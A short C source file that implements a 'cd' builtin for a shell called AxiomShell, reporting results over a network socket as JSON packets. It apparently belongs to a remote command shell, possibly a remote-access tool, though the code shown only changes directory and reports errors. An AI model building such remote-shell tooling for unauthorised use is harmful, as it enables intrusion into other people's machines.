#include <errno.h>
#include <direct.h>
#include "AxiomShell.h"

BOOL BUILTIN_cd(SOCKET sock, size_t argc, char **argv)
{
	char* path;

	if (argc != 1)
	{
		JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] Usage: cd [PATH]\n");
		return (FALSE);
	}

	path = argv[0];
	if (_chdir(path))
	{
		switch (errno)
		{
			case ENOENT:
			    JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] cd: No such file or directory\n");
			    break;
			default:
			    JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] cd: Unknown error\n");
			    break;
		}
		return (FALSE);
	}
	return (TRUE);
}

